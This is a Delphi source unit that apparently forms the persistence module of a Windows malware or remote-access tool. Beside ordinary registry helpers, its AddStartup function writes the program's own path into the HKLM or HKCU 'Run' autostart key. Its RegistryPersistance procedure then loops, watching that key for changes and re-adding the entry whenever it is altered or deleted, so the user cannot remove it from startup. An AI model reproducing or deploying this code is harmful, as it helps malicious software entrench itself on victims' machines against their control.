unit untRegistry;

interface
uses windows, uconfig;

const
  _STRRUN_:String = 'Software\Microsoft\Windows\CurrentVersion\Run\';

function AddRegKey(KEY:HKEY; Path, Keyname, Value, RegType: String):boolean;
function RegKeyExists(RootKey: HKEY; Name, Value: String): boolean;
function DeleteKey(RootKey: HKEY; Name, Value: String):boolean;    
Function GetRegKey(Key:HKEY; Path:string; Value, Default: string): string;
procedure RegistryPersistance;

implementation
uses untUtils;
Function GetRegKey(Key:HKEY; Path:string; Value, Default: string): string;
Var
  Handle:hkey;
  RegType:integer;
  DataSize:integer;
begin
  Result := Default;
  if (RegOpenKeyEx(Key, pchar(Path), 0, $0001, Handle) = 0) then
  begin
    if RegQueryValueEx(Handle, pchar(Value), nil, @RegType, nil, @DataSize) = 0 then
    begin
      SetLength(Result, Datasize);
      RegQueryValueEx(Handle, pchar(Value), nil, @RegType, PByte(pchar(Result)), @DataSize);
      Result := ownTrim(Result);
    end;
    RegCloseKey(Handle);
  end;
end;

function DeleteKey(RootKey: HKEY; Name, Value: String):boolean;
var
  hTemp: HKEY;
begin
  RegOpenKeyEx(RootKey, PChar(Name), 0, KEY_SET_VALUE, hTemp);
  Result := (RegDeleteValue(hTemp, PChar(Value)) = ERROR_SUCCESS);
  RegCloseKey(hTemp);
end;

function RegKeyExists(RootKey: HKEY; Name, Value: String): boolean;
var
  hTemp: HKEY;
begin
  Result := False;
  if RegOpenKeyEx(RootKey, PChar(Name), 0, KEY_READ, hTemp) = ERROR_SUCCESS then begin
    If not (Value = '') then
      Result := (RegQueryValueEx(hTemp, PChar(Value), nil, nil, nil, nil) = ERROR_SUCCESS)
    else
      Result := True;
    RegCloseKey(hTemp);
  end;
end;

function AddStartup():Cardinal;
var
  strCurPath:String;
begin
  strCurPath := '"' + ParamStr(0) + '"';
  if not AddRegKey(HKEY_LOCAL_MACHINE, _STRRUN_,_strStartupK_, strCurPath,'') then
  begin
    if not AddRegKey(HKEY_CURRENT_USER, _STRRUN_,_strStartupK_, strCurPath,'') then
    begin
      Result := 0;
    end else
      Result := HKEY_CURRENT_USER;
  end else
    Result := HKEY_LOCAL_MACHINE;
end;

function AddRegKey(KEY:HKEY; Path, Keyname, Value, RegType: String):boolean;
var
  phkResult: HKEY;
begin
  Result := False;
  if RegType = 'Key' then begin
    RegOpenKeyEx(KEY, PChar(Path), 0, KEY_CREATE_SUB_KEY, phkResult);
    Result := (RegCreateKey(phkResult, PChar(Keyname), phkResult) = ERROR_SUCCESS);
    RegCloseKey(phkResult);
  end else begin
    if RegOpenKeyEx(KEY, PChar(Path), 0, KEY_SET_VALUE, phkResult) = ERROR_SUCCESS then
    begin
      Result := (RegSetValueEx(phkResult, Pchar(Keyname), 0, REG_SZ, Pchar(Value), Length(Value) * 2) = ERROR_SUCCESS);
      RegCloseKey(phkResult);
    end;
  end;
end;

function RegNotifyChange(hRootKey:HKEY):DWORD;
var
  pHKEY:hKey;
  dwNotifyFilter:DWORD;
begin
  Result := ERROR_REGISTRY_CORRUPT;
  dwNotifyFilter := REG_NOTIFY_CHANGE_NAME or REG_NOTIFY_CHANGE_ATTRIBUTES or REG_NOTIFY_CHANGE_LAST_SET or REG_NOTIFY_CHANGE_SECURITY;
  if RegOpenKeyEx(hRootKey, PChar(_STRRUN_), 0, KEY_NOTIFY, pHKEY) = ERROR_SUCCESS then
  begin
    Result := RegNotifyChangeKeyValue(pHKey, TRUE, dwNotifyFilter, 0, False);
    RegCloseKey(pHKey);
  end;
end;

procedure RegistryPersistance;
begin
  repeat
    Sleep(1);
    if RegNotifyChange(AddStartup) <> ERROR_SUCCESS then
      break;
  until 1 = 3;
end;

end.
